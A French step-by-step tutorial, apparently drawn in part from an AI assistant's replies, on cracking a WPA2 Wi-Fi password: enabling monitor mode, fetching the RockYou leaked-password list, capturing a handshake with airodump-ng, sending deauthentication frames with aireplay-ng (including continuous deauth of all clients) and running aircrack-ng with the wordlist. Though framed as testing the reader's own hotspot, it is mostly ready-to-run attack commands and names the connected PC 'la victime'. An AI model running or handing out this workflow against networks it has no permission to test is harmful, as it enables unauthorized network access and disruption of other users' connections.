# Etape 1. Verifier si la carte est compatible mode monitor

Pour vérifier si ta carte Wi-Fi sous Ubuntu prend en charge le mode Monitor (surveillance), nous allons utiliser `iw`.
Le mode Monitor permet à une carte Wi-Fi de capturer les trames 802.11 présentes sur un canal, même celles qui ne sont pas destinées à ton ordinateur.

## Identifier ta carte Wi-Fi

Dans ton terminal, exécute :

```bash
iw dev
```

Si `iw` n'est pas installé :

```bash
sudo apt install iw
```

## Vérifier les modes pris en charge

Exécute :

```bash
iw list
```

Dans le résultat, cherche la section Supported interface modes.

Par exemple :

```bash
Supported interface modes:
    * managed
    * AP
    * monitor
    * P2P-client
```

Voici ce que signifient ces modes :

| Mode         | Fonction                              |
| ------------ | ------------------------------------- |
| `managed`    | Se connecter à un réseau Wi-Fi        |
| `AP`         | Fonctionner comme point d'accès Wi-Fi |
| `monitor`    | Capturer les trames Wi-Fi             |
| `P2P-client` | Connexion Wi-Fi Direct                |

Si `* monitor` apparaît, ta carte et son pilote déclarent prendre en charge le mode Monitor.

## Afficher uniquement les modes compatibles

Pour éviter de parcourir toute la sortie :

```bash
iw list | grep -A 12 "Supported interface modes"
```

# Etape 2. Activation du mode monitor

## Identifier ton interface Wi-Fi

```bash
iw dev
```

Repère son nom, par exemple `wlp2s0`.

## Activer le mode Monitor

Attention : cette opération déconnectera temporairement ton Wi-Fi.

Remplace `wlp2s0` par le nom de ton interface :

```bash
sudo nmcli device disconnect wlp2s0
sudo ip link set wlp2s0 down
sudo iw dev wlp2s0 set type monitor
sudo ip link set wlp2s0 up
```

## Vérifier son activation

```bash
iw dev
```

Tu dois voir :

```bash
type monitor
```

## Revenir au mode normal

```bash
sudo ip link set wlp2s0 down
sudo iw dev wlp2s0 set type managed
sudo ip link set wlp2s0 up
sudo nmcli device set wlp2s0 managed yes
sudo nmcli radio wifi on
sudo systemctl restart NetworkManager
```
## Verifier le status

```bash
nmcli device status
```
Ton interface devrait apparaître avec le type wifi et un état comme disconnected ou connected, plutôt que unmanaged.

# Si le nom de la carte est restee wlp2s0mon

```bash
sudo airmon-ng stop wlp2s0mon
sudo systemctl restart NetworkManager
```

Renommer si necessaire :

```bash
sudo ip link set wlp2s0mon down
sudo ip link set wlp2s0mon name wlp2s0
sudo ip link set wlp2s0 up
sudo systemctl restart NetworkManager
```

# Etape 3. Installer le dictionnaire de mot de passe rockyou

## Installer les outils nécessaires

```bash
sudo apt update
sudo apt install -y git
```

## Télécharger SecLists

```bash
git clone --depth 1 https://github.com/danielmiessler/SecLists.git
```

RockYou se trouve normalement dans :

```bash
SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
```

## Extraire RockYou

```bash
cd ~/SecLists/Passwords/Leaked-Databases
tar -xzf rockyou.txt.tar.gz
```

Ou

```bash
tar -xzf ~/SecLists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C ~/SecLists/Passwords/Leaked-Databases/
ls -lh ~/SecLists/Passwords/Leaked-Databases/rockyou.txt
sudo mkdir -p /usr/share/wordlists
sudo cp ~/SecLists/Passwords/Leaked-Databases/rockyou.txt /usr/share/wordlists/
wc -l /usr/share/wordlists/rockyou.txt
```

## Vérifier son installation

```bash
ls -lh rockyou.txt
```

Pour compter les mots de passe :

```bash
wc -l rockyou.txt
```

## Placer RockYou dans un emplacement standard

```bash
sudo mkdir -p /usr/share/wordlists
sudo cp rockyou.txt /usr/share/wordlists/
```

Tu pourras ensuite accéder au dictionnaire avec :

```bash
/usr/share/wordlists/rockyou.txt
```

## Si probleme des permissions

```bash
sudo chmod 644 /usr/share/wordlists/rockyou.txt
ls -lh /usr/share/wordlists/rockyou.txt
```

# Etape 4. Installer Aircrack-ng

```bash
sudo apt update
sudo apt install -y aircrack-ng iw
```

Vérifie :

```bash
aircrack-ng --help
```

## Identifier ta carte Wi-Fi

Sur Ubuntu :

```bash
sudo airmon-ng
```

Tu devrais obtenir quelque chose comme :

```bash
PHY    Interface    Driver       Chipset
phy0   wlp2s0       iwlwifi      Intel Wireless
```

# Étape 5. Activer le mode Monitor

Nous allons maintenant mettre ta carte Wi-Fi en mode Monitor pour observer les trames de ton point d'accès.

## Identifier ton interface

```bash
sudo airmon-ng
```

Repère le nom de l'interface, par exemple `wlp2s0`.

## Activer le mode Monitor

Attention : cette opération peut déconnecter ton Ubuntu du Wi-Fi.

```bash
sudo airmon-ng start wlp2s0
```

Remplace `wlp2s0` par le nom réel de ton interface.

## Vérifier

```bash
iw dev
```

Tu devrais voir quelque chose comme :

```bash
Interface wlp2s0mon
    type monitor
```

Le nom peut rester `wlp2s0` selon le pilote.

## Observer les réseaux Wi-Fi

Utilise le nom de ton interface en mode Monitor :

```bash
sudo airodump-ng wlp2s0mon
```

Tu verras notamment :

| Colonne | Signification                |
| ------- | ---------------------------- |
| BSSID   | Adresse MAC du point d'accès |
| PWR     | Puissance du signal reçu     |
| CH      | Canal Wi-Fi                  |
| ENC     | Type de chiffrement          |
| ESSID   | Nom du réseau Wi-Fi          |

Repère uniquement le réseau de ton téléphone, puis arrête la capture avec `Ctrl + C`.

Donne-moi le BSSID, le canal (CH) et le type de chiffrement (ENC) de ton point d'accès, sans partager son mot de passe. Nous pourrons ensuite cibler uniquement ton réseau.

# Etape 6. Capturer le handshake WPA2

Nous avons identifié ton point d'accès :

| Paramètre | Valeur              |
| --------- | ------------------- |
| BSSID     | `AA:BB:CC:D1:E2:F3` |
| Canal     | `11`                |
| Sécurité  | WPA2                |

Le handshake WPA2 est un échange de messages entre un appareil et le point d'accès lors de l'authentification.

Il permet notamment de vérifier hors ligne si un mot de passe candidat est correct, sans transmettre ce mot de passe au réseau.

## Capturer uniquement ton réseau

Sur Ubuntu, exécute :

```
sudo airodump-ng \
  --bssid AA:BB:CC:D1:E2:F3 \
  --channel 11 \
  --write ~/capture-wifi \
  wlp2s0mon
```

Remplace `wlp2s0mon` par le nom réel de ton interface Monitor.

Cette commande :

- `--bssid` : cible ton point d'accès.
- `--channel` : écoute le canal 11.
- `--write` : enregistre les captures dans des fichiers.
- `wlp2s0mon` : utilise ta carte Wi-Fi en mode Monitor.

## Verifier si la carte reseau est compatible aireplay-ng pour forcer la reconnexion

```bash
sudo aireplay-ng --test wlp2s0mon
```

## Preparer la capture

```bash
sudo airodump-ng \
  --bssid AA:BB:CC:D1:E2:F3 \
  --channel 11 \
  --write ~/capture-wifi \
  wlp2s0mon
```

## Identifier le client (la victime)

Dans ce premier terminal, regarde la colonne STATION.
Tu devrais y trouver l'adresse MAC du PC Windows connecté à ton point d'accès. Cette adresse est différente du BSSID de ton téléphone.

## Declencher une reconnexion

Pendant que la capture fonctionne, ouvrir un nouveau terminal sur ubuntu :

```bash
sudo aireplay-ng --deauth <nombre_de_paquets> -a <bssid_du_routeur> -c <mac_du_client> <interface_moniteur>
```

<nombre_de_paquets> : Mettez 0 pour un envoi en continu (jusqu'à ce que vous fassiez Ctrl+C), ou un nombre fixe comme 10.

-a <bssid> : L'adresse MAC du point d'accès (routeur/box).

-c <mac_client> : (Optionnel) L'adresse MAC d'un client spécifique ciblé. Si vous l'omettez, cela envoie une déconnexion générale à tous les clients connectés au point d'accès.

<interface_moniteur> : Le nom de votre interface Wi-Fi en mode moniteur (souvent wlan0mon).

## Vérifier la capture

Sur le premier terminal, regarde si cette indication apparaît en haut :

```bash
WPA handshake: AA:BB:CC:D1:E2:F3
```

Si elle apparaît, arrête la capture avec `Ctrl + C`.

Vérifie ensuite les fichiers :

```bash
ls -lh ~/capture-wifi*
```

Tu devrais notamment retrouver un fichier `capture-wifi-01.cap`.

# Etape 7. Tester le mot de passe avec RockYou

Parfait. Tu as capturé un handshake WPA2 ! Nous passons maintenant à l'analyse du mot de passe avec Aircrack-ng et RockYou.

## Étape 7 — Tester le mot de passe avec RockYou

## Arrêter la capture

Dans le premier terminal, appuie sur :

`Ctrl + C`

Cela termine la capture et conserve les fichiers enregistrés.

## Vérifier le fichier de capture

Exécute :

```bash
ls -lh ~/capture-wifi*
```

Tu devrais trouver un fichier similaire à :

```bash
capture-wifi-01.cap
```

## Lancer le test par dictionnaire

Puisque tu testes ton propre point d'accès :

```bash
aircrack-ng \
  -a 2 \
  -b AA:BB:CC:D1:E2:F3 \
  -w /usr/share/wordlists/rockyou.txt \
  ~/capture-wifi-01.cap
```

Explication des paramètres :

| Paramètre | Fonction                               |
| --------- | -------------------------------------- |
| `-a 2`    | Sélectionne l'analyse WPA/WPA2-PSK     |
| `-b`      | Indique le BSSID de ton téléphone      |
| `-w`      | Spécifie le dictionnaire RockYou       |
| `.cap`    | Fichier contenant le handshake capturé |

## Comprendre le résultat

Deux résultats principaux sont possibles :

- `KEY FOUND!` : le mot de passe a été retrouvé dans le dictionnaire. Cela signifie qu'il est vulnérable à cette attaque.
- `KEY NOT FOUND` : aucun candidat du dictionnaire n'a fonctionné. Cela ne signifie pas que le mot de passe est impossible à retrouver.